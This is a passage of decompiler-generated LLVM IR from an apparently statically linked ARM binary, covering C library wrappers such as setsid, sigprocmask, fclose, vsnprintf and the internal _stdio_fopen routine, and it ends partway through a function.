define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1207c = load i32, i32* @r4, align 4
  store i32 %v3_1207c, i32* %stack_var_-8, align 4
  %v0_12080 = call i32 @setsid()
  store i32 %v0_12080, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12080, -4095
  br i1 %tmp, label %dec_label_pc_120a0, label %dec_label_pc_12090

dec_label_pc_12090:                               ; preds = %entry
  %v0_12090 = call i32 @__errno_location()
  %v0_12094 = load i32, i32* %r4.global-to-local, align 4
  %v1_12094 = sub i32 0, %v0_12094
  %v2_12098 = inttoptr i32 %v0_12090 to i32*
  store i32 %v1_12094, i32* %v2_12098, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_120a0

dec_label_pc_120a0:                               ; preds = %entry, %dec_label_pc_12090
  %v0_120a0 = phi i32 [ %v0_12080, %entry ], [ -1, %dec_label_pc_12090 ]
  %v2_120a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_120a4, i32* @r4, align 4
  ret i32 %v0_120a0

; uselistorder directives
  uselistorder i32 %v0_12080, { 1, 0, 2 }
  uselistorder label %dec_label_pc_120a0, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_120a8 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_120a8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_120b05 = load i32, i32* @r4, align 4
  store i32 %v3_120b05, i32* %stack_var_-8, align 4
  br label %dec_label_pc_120d0

bb:                                               ; preds = %entry
  %v3_120b0 = load i32, i32* @r4, align 4
  store i32 %v3_120b0, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_120d0, label %dec_label_pc_120bc

dec_label_pc_120bc:                               ; preds = %bb
  %v0_120bc = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_120c8 = inttoptr i32 %v0_120bc to i32*
  store i32 22, i32* %v2_120c8, align 4
  %v0_120f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_120f4

dec_label_pc_120d0:                               ; preds = %.thread, %bb
  %v7_120d0 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_120d0, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_120d0, -4095
  br i1 %tmp13, label %dec_label_pc_120f0, label %dec_label_pc_120e0

dec_label_pc_120e0:                               ; preds = %dec_label_pc_120d0
  %v0_120e0 = call i32 @__errno_location()
  %v0_120e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_120e4 = sub i32 0, %v0_120e4
  %v2_120e8 = inttoptr i32 %v0_120e0 to i32*
  store i32 %v1_120e4, i32* %v2_120e8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_120f0

dec_label_pc_120f0:                               ; preds = %dec_label_pc_120d0, %dec_label_pc_120e0
  %v0_120f0 = phi i32 [ %v7_120d0, %dec_label_pc_120d0 ], [ -1, %dec_label_pc_120e0 ]
  store i32 %v0_120f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_120f4

dec_label_pc_120f4:                               ; preds = %dec_label_pc_120bc, %dec_label_pc_120f0
  %v0_120f4 = phi i32 [ %v0_120f4.pre, %dec_label_pc_120bc ], [ %v0_120f0, %dec_label_pc_120f0 ]
  %v2_120f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_120f8, i32* @r4, align 4
  ret i32 %v0_120f4

; uselistorder directives
  uselistorder i32 %v7_120d0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_120f4, { 1, 0 }
  uselistorder label %dec_label_pc_120f0, { 1, 0 }
  uselistorder label %dec_label_pc_120d0, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_120fc = load i32, i32* @r4, align 4
  store i32 %v3_120fc, i32* %stack_var_-8, align 4
  %v2_12100 = call i32 @time(i32* %arg1)
  store i32 %v2_12100, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_12100, -4095
  br i1 %tmp, label %dec_label_pc_12120, label %dec_label_pc_12110

dec_label_pc_12110:                               ; preds = %entry
  %v0_12110 = call i32 @__errno_location()
  %v0_12114 = load i32, i32* %r4.global-to-local, align 4
  %v1_12114 = sub i32 0, %v0_12114
  %v2_12118 = inttoptr i32 %v0_12110 to i32*
  store i32 %v1_12114, i32* %v2_12118, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12120

dec_label_pc_12120:                               ; preds = %entry, %dec_label_pc_12110
  %v0_12120 = phi i32 [ %v2_12100, %entry ], [ -1, %dec_label_pc_12110 ]
  %v2_12124 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12124, i32* @r4, align 4
  ret i32 %v0_12120

; uselistorder directives
  uselistorder i32 %v2_12100, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12120, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_1212c = call i32 @wait4()
  ret i32 %v0_1212c
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12130 = load i32, i32* @r4, align 4
  store i32 %v3_12130, i32* %stack_var_-8, align 4
  %v3_12134 = load i32, i32* @r2, align 4
  %v4_12134 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_12134)
  store i32 %v4_12134, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12134, -4095
  br i1 %tmp, label %dec_label_pc_12154, label %dec_label_pc_12144

dec_label_pc_12144:                               ; preds = %entry
  %v0_12144 = call i32 @__errno_location()
  %v0_12148 = load i32, i32* %r4.global-to-local, align 4
  %v1_12148 = sub i32 0, %v0_12148
  %v2_1214c = inttoptr i32 %v0_12144 to i32*
  store i32 %v1_12148, i32* %v2_1214c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12154

dec_label_pc_12154:                               ; preds = %entry, %dec_label_pc_12144
  %v0_12154 = phi i32 [ %v4_12134, %entry ], [ -1, %dec_label_pc_12144 ]
  %v2_12158 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12158, i32* @r4, align 4
  ret i32 %v0_12154

; uselistorder directives
  uselistorder i32 %v4_12134, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12154, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12160 = load i32, i32* @global_var_2d288, align 4
  %v3_12164 = mul i32 %arg1, 2
  %v4_12164 = add i32 %v2_12160, %v3_12164
  %v5_12164 = inttoptr i32 %v4_12164 to i8*
  %v6_12164 = load i8, i8* %v5_12164, align 1
  %v8_12164 = zext i8 %v6_12164 to i32
  %v1_12168 = and i32 %v8_12164, 32
  ret i32 %v1_12168
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1217c = icmp slt i32 %arg1, 0
  br i1 %v1_1217c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1217c = mul i32 %arg1, 2
  %v2_12188 = load i32, i32* @global_var_2d290, align 4
  %v2_1218c = add i32 %v2_12188, %v2_1217c
  %v3_12190 = inttoptr i32 %v2_1218c to i8*
  %v4_12190 = load i8, i8* %v3_12190, align 1
  %v6_12190 = zext i8 %v4_12190 to i32
  %v1_12194 = add i32 %v2_1218c, 1
  %v2_12194 = inttoptr i32 %v1_12194 to i8*
  %v3_12194 = load i8, i8* %v2_12194, align 1
  %v4_12194 = zext i8 %v3_12194 to i32
  %v3_12198 = mul nuw i32 %v4_12194, 16777216
  %v4_1219c = sdiv i32 %v3_12198, 65536
  %v5_1219c = or i32 %v4_1219c, %v6_12190
  ret i32 %v5_1219c

; uselistorder directives
  uselistorder i32 %v2_1218c, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_33858.996 to i32)
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_121b4 = load i32, i32* @r4, align 4
  store i32 %v3_121b4, i32* %stack_var_-32, align 4
  %v6_121b4 = load i32, i32* @r5, align 4
  %v9_121b4 = load i32, i32* @r6, align 4
  %v12_121b4 = load i32, i32* @r7, align 4
  %v15_121b4 = load i32, i32* @r8, align 4
  %v2_121b8 = add i32 %tmp, 52
  %v3_121b8 = inttoptr i32 %v2_121b8 to i32*
  %v4_121b8 = load i32, i32* %v3_121b8, align 4
  store i32 %v4_121b8, i32* @r8, align 4
  %v2_121bc = add i32 %tmp, 56
  store i32 %v2_121bc, i32* @r5, align 4
  %v2_121c0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_121c4 = icmp eq i32 %v4_121b8, 0
  store i1 %v2_121c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_121d4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_121d4, i32* @r0, align 4
  br i1 %v2_121c4, label %dec_label_pc_121dc, label %dec_label_pc_121f8

dec_label_pc_121dc:                               ; preds = %entry
  store i32 90076, i32* %r3.global-to-local, align 4
  %v1_121e4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15fd4.998 to i32), i32* %r3.global-to-local, align 4
  %v1_121f4 = call i32 @__pthread_return_0()
  %v0_121f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_121f8

dec_label_pc_121f8:                               ; preds = %entry, %dec_label_pc_121dc
  %v0_12200 = phi i32 [ %tmp, %entry ], [ %v0_121f8.pre, %dec_label_pc_121dc ]
  %v1_121f8 = inttoptr i32 %v0_12200 to i8*
  %v2_121f8 = load i8, i8* %v1_121f8, align 1
  %v3_121f8 = zext i8 %v2_121f8 to i32
  %v1_121fc = and i32 %v3_121f8, 64
  store i32 %v1_121fc, i32* %r3.global-to-local, align 4
  %v2_121fc = icmp eq i32 %v1_121fc, 0
  store i1 %v2_121fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_121fc, i32* @r7, align 4
  br i1 %v2_121fc, label %dec_label_pc_12214, label %dec_label_pc_1220c

dec_label_pc_1220c:                               ; preds = %dec_label_pc_121f8
  %v3_1220c = call i32 @fflush_unlocked(i8* %v1_121f8)
  store i32 %v3_1220c, i32* @r7, align 4
  %v0_12214.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12214

dec_label_pc_12214:                               ; preds = %dec_label_pc_121f8, %dec_label_pc_1220c
  %v0_12214 = phi i32 [ %v0_12200, %dec_label_pc_121f8 ], [ %v0_12214.pre, %dec_label_pc_1220c ]
  %v1_12214 = add i32 %v0_12214, 4
  %v2_12214 = inttoptr i32 %v1_12214 to i32*
  %v3_12214 = load i32, i32* %v2_12214, align 4
  %v1_12218 = call i32 @__libc_close(i32 %v3_12214)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_12220 = icmp slt i32 %v1_12218, 0
  %v2_12220 = icmp eq i32 %v1_12218, 0
  store i1 %v2_12220, i1* %cpsr_z.global-to-local, align 1
  %v1_12224 = load i32, i32* @r4, align 4
  %v2_12224 = add i32 %v1_12224, 4
  %v3_12224 = inttoptr i32 %v2_12224 to i32*
  store i32 -1, i32* %v3_12224, align 4
  store i32 %v2_121c0, i32* @r0, align 4
  br i1 %v1_12220, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_12214
  %v3_12238 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_12238, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_12214, %bb
  %v1_12244 = call i32 @__pthread_return_void()
  %v1_12250 = call i32 @__pthread_return_0()
  %v2_12258 = load i32, i32* @global_var_31624.1004, align 4
  %v1_1225c = add i32 %v2_12258, 1
  store i32 %v1_1225c, i32* %r3.global-to-local, align 4
  store i32 %v1_1225c, i32* @global_var_31624.1004, align 4
  store i32 %v2_121c0, i32* @r0, align 4
  %v1_12274 = call i32 @__pthread_return_void()
  %v0_12278 = load i32, i32* @r4, align 4
  %v1_12278 = inttoptr i32 %v0_12278 to i32*
  %v2_12278 = load i32, i32* %v1_12278, align 4
  %v1_1227c = and i32 %v2_12278, 24576
  store i32 %v1_1227c, i32* %r3.global-to-local, align 4
  %v3_122801 = udiv i32 %v1_1227c, 256
  %v1_12284 = trunc i32 %v3_122801 to i8
  %v3_12284 = add i32 %v0_12278, 1
  %v4_12284 = inttoptr i32 %v3_12284 to i8*
  store i8 %v1_12284, i8* %v4_12284, align 1
  %v0_12288 = load i32, i32* %r3.global-to-local, align 4
  %v1_12288 = trunc i32 %v0_12288 to i8
  %v2_12288 = load i32, i32* @r4, align 4
  %v3_12288 = inttoptr i32 %v2_12288 to i8*
  store i8 %v1_12288, i8* %v3_12288, align 1
  %v0_1228c = load i32, i32* @r4, align 4
  %v1_1228c = inttoptr i32 %v0_1228c to i32*
  %v2_1228c = load i32, i32* %v1_1228c, align 4
  %v1_12290 = or i32 %v2_1228c, 48
  store i32 %v1_12290, i32* %r3.global-to-local, align 4
  %v3_12294 = sdiv i32 %v2_1228c, 256
  %v0_12298 = load i32, i32* @r8, align 4
  %v2_12298 = icmp eq i32 %v0_12298, 0
  store i1 %v2_12298, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_121d4, i32* @r0, align 4
  %v1_122a8 = trunc i32 %v3_12294 to i8
  %v3_122a8 = add i32 %v0_1228c, 1
  %v4_122a8 = inttoptr i32 %v3_122a8 to i8*
  store i8 %v1_122a8, i8* %v4_122a8, align 1
  %v0_122ac = load i32, i32* %r3.global-to-local, align 4
  %v1_122ac = trunc i32 %v0_122ac to i8
  %v2_122ac = load i32, i32* @r4, align 4
  %v3_122ac = inttoptr i32 %v2_122ac to i8*
  store i8 %v1_122ac, i8* %v3_122ac, align 1
  %v0_122b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_122b0, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_122b4 = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_122b8 = load i32, i32* @r4, align 4
  %v1_122b8 = add i32 %v0_122b8, 1
  %v2_122b8 = inttoptr i32 %v1_122b8 to i8*
  %v3_122b8 = load i8, i8* %v2_122b8, align 1
  %v4_122b8 = zext i8 %v3_122b8 to i32
  store i32 %v4_122b8, i32* %r3.global-to-local, align 4
  %v1_122bc = and i32 %v4_122b8, 64
  %v2_122bc = icmp eq i32 %v1_122bc, 0
  store i1 %v2_122bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_122bc, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_122c4 = xor i1 %v2_122bc, true
  call void @__pseudo_cond_branch(i1 %v1_122c4, i32 ptrtoint (i32* @global_var_14ed0.1006 to i32))
  store i32 %v2_121c0, i32* @r0, align 4
  %v1_122d8 = call i32 @__pthread_return_void()
  %v1_122e4 = call i32 @__pthread_return_0()
  %v2_122ec = load i32, i32* @global_var_31628.1009, align 4
  %v1_122f0 = add i32 %v2_122ec, 1
  store i32 %v1_122f0, i32* %r3.global-to-local, align 4
  store i32 %v2_121c0, i32* @r0, align 4
  store i32 %v1_122f0, i32* @global_var_31628.1009, align 4
  %v1_12304 = call i32 @__pthread_return_void()
  %v1_12308 = call i32 @_stdio_openlist_dec_use(i32 %v1_12304)
  %v0_1230c = load i32, i32* @r7, align 4
  %v2_12314 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12314, i32* @r4, align 4
  store i32 %v6_121b4, i32* @r5, align 4
  store i32 %v9_121b4, i32* @r6, align 4
  store i32 %v12_121b4, i32* @r7, align 4
  store i32 %v15_121b4, i32* @r8, align 4
  ret i32 %v0_1230c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_12214, { 1, 0 }
  uselistorder label %dec_label_pc_121f8, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1233c = call i32 @_stdio_fopen()
  ret i32 %v0_1233c
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_12388 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_12388, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_1239c = call i32 @__GI_vsnprintf()
  ret i32 %v0_1239c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_123b0 = load i32, i32* @r4, align 4
  %v6_123b0 = load i32, i32* @r5, align 4
  %v12_123b0 = load i32, i32* @r7, align 4
  %v15_123b0 = load i32, i32* @r8, align 4
  %v18_123b0 = load i32, i32* @sl, align 4
  %v0_123b4 = load i32, i32* @r3, align 4
  store i32 %v0_123b4, i32* @r8, align 4
  %v2_123b8 = ptrtoint i32* %stack_var_-108 to i32
  %v0_123c0 = load i32, i32* @r0, align 4
  %v1_123c0 = sub i32 -1, %v0_123c0
  store i32 %v1_123c0, i32* @r5, align 4
  store i32 %v0_123c0, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_123d4 = load i32, i32* @r1, align 4
  %v3_123d4 = icmp ult i32 %v1_123c0, %v1_123d4
  br i1 %v3_123d4, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_123d4, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_123dc = load i32, i32* @r2, align 4
  store i32 %v0_123dc, i32* @r7, align 4
  %v2_123e0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_123e0, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_123fc = call i32 @__stdio_init_mutex()
  %v0_12400 = load i32, i32* @r4, align 4
  %v1_12400 = load i32, i32* @r5, align 4
  %v0_12408 = load i32, i32* @r7, align 4
  %v0_1240c = load i32, i32* @r8, align 4
  %v3_1242c = inttoptr i32 %v0_12408 to i8*
  %v4_1242c = call i32 @_vfprintf_internal(i32 %v2_123b8, i8* %v3_1242c, i32 %v0_1240c)
  %v0_12430 = load i32, i32* @r5, align 4
  %v1_12430 = load i32, i32* @sl, align 4
  %v9_12430 = icmp eq i32 %v0_12430, %v1_12430
  br i1 %v9_12430, label %dec_label_pc_12458, label %dec_label_pc_1243c

dec_label_pc_1243c:                               ; preds = %bb23
  %v9_12444 = icmp eq i32 %v1_12400, 0
  %v1_12448 = sext i1 %v9_12444 to i32
  %v1_12448.v0_12424 = add i32 %v0_12400, %v1_12448
  %stack_var_-92.0 = inttoptr i32 %v1_12448.v0_12424 to i8*
  %v1_12454 = trunc i32 %v1_12430 to i8
  store i8 %v1_12454, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_12458

dec_label_pc_12458:                               ; preds = %bb23, %dec_label_pc_1243c
  store i32 %v3_123b0, i32* @r4, align 4
  store i32 %v6_123b0, i32* @r5, align 4
  store i32 %v12_123b0, i32* @r7, align 4
  store i32 %v15_123b0, i32* @r8, align 4
  store i32 %v18_123b0, i32* @sl, align 4
  ret i32 %v4_1242c

; uselistorder directives
  uselistorder i32 %v1_123d4, { 1, 0 }
  uselistorder i32 %v0_123c0, { 1, 0 }
  uselistorder label %dec_label_pc_12458, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12460 = load i32, i32* @r4, align 4
  store i32 %v3_12460, i32* %stack_var_-24, align 4
  %v6_12460 = load i32, i32* @r5, align 4
  %v9_12460 = load i32, i32* @r6, align 4
  %v15_12460 = load i32, i32* @r8, align 4
  %v0_12464 = load i32, i32* @r1, align 4
  %v1_12464 = inttoptr i32 %v0_12464 to i8*
  %v2_12464 = load i8, i8* %v1_12464, align 1
  %v7_12468 = icmp eq i8 %v2_12464, 114
  store i1 %v7_12468, i1* %cpsr_z.global-to-local, align 1
  %v2_1246c = ptrtoint i32* %stack_var_-56 to i32
  %v0_12470 = load i32, i32* @r0, align 4
  store i32 %v0_12470, i32* @r6, align 4
  %v0_12474 = load i32, i32* @r2, align 4
  store i32 %v0_12474, i32* @r8, align 4
  %v0_12478 = load i32, i32* @r3, align 4
  store i32 %v0_12478, i32* @r5, align 4
  br i1 %v7_12468, label %dec_label_pc_124c4, label %dec_label_pc_12480

dec_label_pc_12480:                               ; preds = %entry
  %v7_12480 = icmp eq i8 %v2_12464, 119
  store i1 %v7_12480, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12480, label %bb, label %dec_label_pc_1248c

bb:                                               ; preds = %dec_label_pc_12480
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_124c8

dec_label_pc_1248c:                               ; preds = %dec_label_pc_12480
  %v7_1248c = icmp eq i8 %v2_12464, 97
  store i1 %v7_1248c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1248c, label %bb30, label %dec_label_pc_12498

bb30:                                             ; preds = %dec_label_pc_1248c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_124c8

dec_label_pc_12498:                               ; preds = %dec_label_pc_1248c, %dec_label_pc_12550, %dec_label_pc_12524
  %v0_12498 = call i32 @__errno_location()
  store i32 %v0_12498, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_124a0 = load i32, i32* @r8, align 4
  %v2_124a0 = icmp eq i32 %v0_124a0, 0
  store i1 %v2_124a0, i1* %cpsr_z.global-to-local, align 1
  %v2_124a4 = inttoptr i32 %v0_12498 to i32*
  store i32 22, i32* %v2_124a4, align 4
  br i1 %v2_124a0, label %dec_label_pc_12718, label %dec_label_pc_124ac

dec_label_pc_124ac:                               ; preds = %dec_label_pc_12574._crit_edge, %dec_label_pc_12498
  %v0_124ac = load i32, i32* @r8, align 4
  %v1_124ac = add i32 %v0_124ac, 1
  %v2_124ac = inttoptr i32 %v1_124ac to i8*
  %v3_124ac = load i8, i8* %v2_124ac, align 1
  %v4_124ac = zext i8 %v3_124ac to i32
  store i32 %v4_124ac, i32* %r3.global-to-local, align 4
  %v1_124b0 = and i32 %v4_124ac, 32
  %v2_124b0 = icmp eq i32 %v1_124b0, 0
  store i1 %v2_124b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_124b0, label %dec_label_pc_12718, label %dec_label_pc_124b8

dec_label_pc_124b8:                               ; preds = %dec_label_pc_124ac
  store i32 %v0_124ac, i32* @r0, align 4
  %v0_124bc = call i32 @free()
  store i32 %v0_124bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12718

dec_label_pc_124c4:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_124c8

dec_label_pc_124c8:                               ; preds = %bb, %bb30, %dec_label_pc_124c4
  %v1_124e0 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_124c4 ]
  %v1_124c8 = add i32 %v0_12464, 1
  %v2_124c8 = inttoptr i32 %v1_124c8 to i8*
  %v3_124c8 = load i8, i8* %v2_124c8, align 1
  %v7_124cc = icmp eq i8 %v3_124c8, 98
  store i1 %v7_124cc, i1* %cpsr_z.global-to-local, align 1
  %v1_124c8.v0_12464 = select i1 %v7_124cc, i32 %v1_124c8, i32 %v0_12464
  store i32 %v1_124c8.v0_12464, i32* %r3.global-to-local, align 4
  %v1_124d8 = add i32 %v1_124c8.v0_12464, 1
  %v2_124d8 = inttoptr i32 %v1_124d8 to i8*
  %v3_124d8 = load i8, i8* %v2_124d8, align 1
  %v4_124d8 = zext i8 %v3_124d8 to i32
  store i32 %v4_124d8, i32* %r3.global-to-local, align 4
  %v7_124dc = icmp eq i8 %v3_124d8, 43
  store i1 %v7_124dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_124dc, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_124c8
  store i32 %v1_124e0, i32* %r3.global-to-local, align 4
  %v2_124e4 = add nuw nsw i32 %v1_124e0, 1
  store i32 %v2_124e4, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_124c8, %bb33
  %v2_124e8 = icmp eq i32 %v0_12474, 0
  store i1 %v2_124e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_124e8, label %dec_label_pc_124f0, label %dec_label_pc_1251c

dec_label_pc_124f0:                               ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_124f4 = call i32 @malloc(i32 80)
  store i32 %v1_124f4, i32* %r0.global-to-local, align 4
  store i32 %v1_124f4, i32* @r8, align 4
  %v3_124f8 = icmp eq i32 %v1_124f4, 0
  store i1 %v3_124f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_124f8, label %dec_label_pc_1271c, label %dec_label_pc_12500

dec_label_pc_12500:                               ; preds = %dec_label_pc_124f0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_12508 = add i32 %v1_124f4, 1
  %v4_12508 = inttoptr i32 %v3_12508 to i8*
  store i8 32, i8* %v4_12508, align 1
  %v0_1250c = load i32, i32* %r2.global-to-local, align 4
  %v1_1250c = load i32, i32* @r8, align 4
  %v2_1250c = add i32 %v1_1250c, 8
  %v3_1250c = inttoptr i32 %v2_1250c to i32*
  store i32 %v0_1250c, i32* %v3_1250c, align 4
  %v0_12510 = load i32, i32* %r2.global-to-local, align 4
  %v1_12510 = trunc i32 %v0_12510 to i8
  %v2_12510 = load i32, i32* @r8, align 4
  %v3_12510 = inttoptr i32 %v2_12510 to i8*
  store i8 %v1_12510, i8* %v3_12510, align 1
  %v0_12514 = load i32, i32* @r8, align 4
  %v1_12514 = add i32 %v0_12514, 56
  store i32 %v1_12514, i32* @r0, align 4
  %v0_12518 = call i32 @__stdio_init_mutex()
  store i32 %v0_12518, i32* %r0.global-to-local, align 4
  %v0_1251c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1251c

dec_label_pc_1251c:                               ; preds = %.thread4, %dec_label_pc_12500
  %v0_12574 = phi i32 [ %v0_12478, %.thread4 ], [ %v0_1251c.pre, %dec_label_pc_12500 ]
  %v1_1251c = icmp slt i32 %v0_12574, 0
  %v2_1251c = icmp eq i32 %v0_12574, 0
  store i1 %v2_1251c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1251c, label %dec_label_pc_12574, label %dec_label_pc_12524

dec_label_pc_12524:                               ; preds = %dec_label_pc_1251c
  %v0_12528 = load i32, i32* @r4, align 4
  %v2_12528 = and i32 %v0_12528, ptrtoint ([28 x i8]* @global_var_20003.1013 to i32)
  %v1_1252c = or i32 %v2_12528, 1
  store i32 %v1_1252c, i32* %r2.global-to-local, align 4
  %v0_12530 = load i32, i32* @r6, align 4
  %v1_12530 = add i32 %v0_12530, 1
  %v2_12534 = and i32 %v1_12530, %v1_1252c
  store i32 %v2_12534, i32* %r3.global-to-local, align 4
  %v9_12538 = icmp eq i32 %v2_12534, %v1_1252c
  store i1 %v9_12538, i1* %cpsr_z.global-to-local, align 1
  %v1_1253c = load i32, i32* @r8, align 4
  %v2_1253c = add i32 %v1_1253c, 4
  %v3_1253c = inttoptr i32 %v2_1253c to i32*
  store i32 %v0_12574, i32* %v3_1253c, align 4
  br i1 %v9_12538, label %dec_label_pc_12544, label %dec_label_pc_12498

dec_label_pc_12544:                               ; preds = %dec_label_pc_12524
  %v0_12544 = load i32, i32* @r4, align 4
